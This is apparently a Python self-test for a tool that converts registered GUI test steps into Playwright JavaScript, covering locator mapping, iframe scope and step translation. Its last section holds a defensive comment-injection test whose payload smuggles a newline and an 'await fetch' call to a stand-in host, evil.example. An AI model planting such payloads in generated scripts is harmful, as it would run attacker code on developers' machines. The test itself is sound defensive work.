"""playwright_exporter 自测（纯函数，免 DB；registry 作参数传入）。
运行: cd backend && .venv/bin/python -m scripts.test_playwright_export

覆盖：
- key→locator 各 by 类型映射（testid/role/label/text/placeholder/css），镜像 gui-core.mjs::byToLocator
- 多候选 → .or() 链（自愈）
- frame 作用域：shell（顶层 page）/ vm（frameLocator(vmIframe)）
- 各 step→语句：click/fill/wait_for/get_text/goto/assert_visible/assert_text
- 未登记 key → 抛错占位 + TODO 注释（其余步照常）
- wait_response/judge → TODO 占位注释
- connect 步 → 不产额外定位（连接头已在模板）
- 文件头含 connectOverCDP(9222) 与前置说明
"""
from app.services.playwright_exporter import export_case_to_playwright, _locator_expr


# 一个覆盖多种 by 与 frame 的注册表
REGISTRY = {
    "loginUserName": {
        "frame": "shell",
        "desc": "登录 用户名输入框",
        "candidates": [
            {"by": "css", "value": "input[name=userName]"},
            {"by": "placeholder", "value": "手机号/用户名/邮箱"},
        ],
    },
    "loginSubmit": {
        "frame": "shell",
        "desc": "登录 提交按钮",
        "candidates": [{"by": "css", "value": "input[type=submit]"}],
    },
    "sendBtn": {
        "frame": "vm",
        "desc": "发送按钮",
        "candidates": [{"by": "role", "value": "button", "name": "发送"}],
    },
    "titleText": {
        "frame": "vm",
        "desc": "标题",
        "candidates": [
            {"by": "testid", "value": "chat-title"},
            {"by": "text", "value": "对话"},
            {"by": "label", "value": "标题"},
        ],
    },
}
VM_IFRAME = 'iframe[src*=".work.n.cn"]'


def _case(script, kind="gui", title="登录冒烟", steps="打开→登录", expected="进入首页"):
    return {"id": 42, "title": title, "exec_kind": kind, "steps": steps,
            "expected": expected, "script": script}


def main():
    # ---- _locator_expr：各 by 类型映射（shell 作用域 = page）----
    # css → page.locator('...')
    e = _locator_expr(REGISTRY["loginSubmit"], "loginSubmit", REGISTRY, VM_IFRAME)
    assert e == "page.locator('input[type=submit]').first()", e

    # 多候选 css + placeholder → .or() 链
    e = _locator_expr(REGISTRY["loginUserName"], "loginUserName", REGISTRY, VM_IFRAME)
    assert e == "page.locator('input[name=userName]').or(page.getByPlaceholder('手机号/用户名/邮箱')).first()", e

    # vm 作用域 → frameLocator(vmIframe) 前缀；role 带 name
    e = _locator_expr(REGISTRY["sendBtn"], "sendBtn", REGISTRY, VM_IFRAME)
    assert e == "vm.getByRole('button', { name: '发送' }).first()", e

    # vm + 多候选：testid / text / label
    e = _locator_expr(REGISTRY["titleText"], "titleText", REGISTRY, VM_IFRAME)
    assert e == "vm.getByTestId('chat-title').or(vm.getByLabel('标题')).or(vm.getByText('对话')).first()", e

    # 脆弱候选(text/role)必须被降到链尾：即便注册表里 text 排在 testid 之前
    reordered = _locator_expr(
        {"frame": "vm", "candidates": [
            {"by": "text", "value": "对话"},
            {"by": "testid", "value": "chat-title"},
        ]}, "x", REGISTRY, VM_IFRAME)
    assert reordered == "vm.getByTestId('chat-title').or(vm.getByText('对话')).first()", reordered
    # 每个 _locator_expr 结果都以 .first() 收尾（消除 .or() 多命中 strict 违例）
    for k in REGISTRY:
        assert _locator_expr(REGISTRY[k], k, REGISTRY, VM_IFRAME).endswith(".first()"), k

    # ---- 完整用例：多 step 翻译 ----
    script = [
        {"action": "connect", "desc": "连接客户端"},
        {"action": "fill", "target": {"key": "loginUserName"}, "args": {"text": "qa"}, "desc": "填用户名"},
        {"action": "click", "target": {"key": "loginSubmit"}, "desc": "点登录"},
        {"action": "wait_for", "target": {"key": "sendBtn"}, "args": {"timeout_ms": 8000}, "desc": "等发送按钮"},
        {"action": "assert_visible", "target": {"key": "sendBtn"}, "desc": "断言可见"},
        {"action": "assert_text", "target": {"key": "titleText"}, "args": {"expected": "对话", "contains": True}, "desc": "断言标题含对话"},
    ]
    out = export_case_to_playwright(_case(script), REGISTRY, VM_IFRAME)

    # 文件头：CDP 连接 + iframe 作用域 + 前置说明
    assert "connectOverCDP" in out
    assert "127.0.0.1:9222" in out
    assert "--remote-debugging-port=9222" in out, "文件头应说明前置：带调试端口启动客户端"
    assert "@playwright/test" in out or "playwright/test" in out
    # vm 作用域变量应被定义（业务页在 iframe）
    assert VM_IFRAME in out
    assert "frameLocator(" in out

    # 逐 step 语句
    assert "getByPlaceholder('手机号/用户名/邮箱')" in out  # fill 用到 loginUserName 的 or 链
    assert ".fill('qa')" in out
    assert "page.locator('input[type=submit]').or" not in out  # loginSubmit 单候选，无 or
    assert "page.locator('input[type=submit]').first().click()" in out
    assert ".click()" in out
    assert "waitFor({ state: 'visible', timeout: 8000 })" in out
    assert "toBeVisible()" in out
    assert "toContainText('对话')" in out, "contains=True → toContainText"
    # 每步 desc 作为注释
    assert "// 填用户名" in out
    assert "// 点登录" in out
    # connect 步转成注释说明，不产额外 locator 语句
    assert "connect" in out.lower()

    # ---- assert_text contains=False → toHaveText ----
    out2 = export_case_to_playwright(
        _case([{"action": "assert_text", "target": {"key": "titleText"},
                "args": {"expected": "对话", "contains": False}, "desc": "断言标题等于"}]),
        REGISTRY, VM_IFRAME)
    assert "toHaveText('对话')" in out2, out2

    # ---- goto ----
    out3 = export_case_to_playwright(
        _case([{"action": "goto", "args": {"url": "https://work.n.cn/claw"}, "desc": "打开首页"}]),
        REGISTRY, VM_IFRAME)
    assert "goto('https://work.n.cn/claw')" in out3, out3

    # ---- get_text → textContent ----
    out4 = export_case_to_playwright(
        _case([{"action": "get_text", "target": {"key": "titleText"}, "desc": "取标题文本"}]),
        REGISTRY, VM_IFRAME)
    assert "textContent()" in out4, out4

    # ---- 原始 selector（target.selector 而非 key）直接用 ----
    out5 = export_case_to_playwright(
        _case([{"action": "click", "target": {"selector": ".foo-btn"}, "desc": "点原始选择器"}]),
        REGISTRY, VM_IFRAME)
    assert "locator('.foo-btn')" in out5, out5

    # ---- 未登记 key → 抛错占位 + TODO，其余步照常 ----
    out6 = export_case_to_playwright(
        _case([
            {"action": "click", "target": {"key": "loginSubmit"}, "desc": "正常步"},
            {"action": "click", "target": {"key": "ghostKey"}, "desc": "缺 key 步"},
        ]),
        REGISTRY, VM_IFRAME)
    assert "TODO" in out6
    assert "ghostKey" in out6, "占位注释应点名缺失的 key"
    assert "throw new Error" in out6, "缺 key 步应生成抛错占位，避免静默跳过"
    assert "input[type=submit]" in out6, "其余步应照常翻译"

    # ---- wait_response / judge → TODO 占位注释 ----
    out7 = export_case_to_playwright(
        _case([
            {"action": "wait_response", "args": {"timeout_ms": 30000}, "desc": "等AI回复"},
            {"action": "judge", "args": {"question": "回复是否合理"}, "desc": "主观判定"},
        ]),
        REGISTRY, VM_IFRAME)
    assert out7.count("TODO") >= 2, "wait_response 与 judge 各一条 TODO"
    assert "回复是否合理" in out7, "judge 的问题应写入注释供开发手写"

    # ---- 非 gui/e2e → 抛 ValueError（接口层据此 400/跳过）----
    try:
        export_case_to_playwright(_case([{"action": "click", "target": {"key": "loginSubmit"}}], kind="api"),
                                  REGISTRY, VM_IFRAME)
        assert False, "api 用例本应拒绝"
    except ValueError as ex:
        assert "gui" in str(ex) or "e2e" in str(ex), str(ex)

    # ---- e2e 放行 ----
    out8 = export_case_to_playwright(
        _case([{"action": "click", "target": {"key": "loginSubmit"}, "desc": "x"}], kind="e2e"),
        REGISTRY, VM_IFRAME)
    assert ".click()" in out8

    # ---- 无 script（空列表）→ 抛 ValueError ----
    try:
        export_case_to_playwright(_case([]), REGISTRY, VM_IFRAME)
        assert False, "空 script 本应拒绝"
    except ValueError as ex:
        assert "script" in str(ex).lower(), str(ex)

    # ---- 用例标题写进文件（test 名/注释）----
    assert "登录冒烟" in out, "用例标题应出现在生成文件中"

    # ---- 安全：注释注入（换行逃逸 // 注释 → 实时执行代码）必须被封堵 ----
    # desc/title/action/key 等来自其他成员/AI 生成的用例文本，被导出脚本在开发本机 `npx playwright test`
    # 运行；若含换行则可逃出 // 行注释，把注入代码变成 live 语句（存储型注入 → 开发机执行）。
    MARK = "http://evil.example/EXFIL"
    payload = f"点登录\nawait fetch('{MARK}'); //"
    # payload 换行后的可执行片段：换行若未被消除，它会另起一行成为 live 代码。
    _live_head = payload.split("\n", 1)[1].strip()  # await fetch('...'); //

    def _no_live_injection(text: str):
        # 真正的危险是注入代码单独成行被执行。MARK 落在 // 注释（_js_comment 去换行）或
        # 单引号字符串字面量（_js_str 去换行 + 转义 ' → \\'，如 test('<title>') / 断言文本）里都安全——
        # 它始终与前文同行。故校验：没有任何一行以该可执行片段开头（换行注入未逃逸成 live 代码）。
        for ln in text.splitlines():
            assert not ln.strip().startswith(_live_head), f"注入逃逸成 live 代码: {ln!r}"

    # desc 注入
    _no_live_injection(export_case_to_playwright(
        _case([{"action": "click", "target": {"key": "loginSubmit"}, "desc": payload}]),
        REGISTRY, VM_IFRAME))
    # title 注入（写进文件头注释与 test 名）
    _no_live_injection(export_case_to_playwright(
        _case([{"action": "click", "target": {"key": "loginSubmit"}, "desc": "x"}], title=payload),
        REGISTRY, VM_IFRAME))
    # action 注入（写进 // stepN [action] 注释）
    _no_live_injection(export_case_to_playwright(
        _case([{"action": payload, "target": {"key": "loginSubmit"}, "desc": "x"}]),
        REGISTRY, VM_IFRAME))
    # 未登记 key 注入（写进 TODO 注释）
    _no_live_injection(export_case_to_playwright(
        _case([{"action": "click", "target": {"key": payload}, "desc": "x"}]),
        REGISTRY, VM_IFRAME))
    # steps/expected 注入（写进文件头注释）
    _no_live_injection(export_case_to_playwright(
        _case([{"action": "click", "target": {"key": "loginSubmit"}, "desc": "x"}],
              steps=payload, expected=payload),
        REGISTRY, VM_IFRAME))

    print("OK test_playwright_export")


if __name__ == "__main__":
    main()
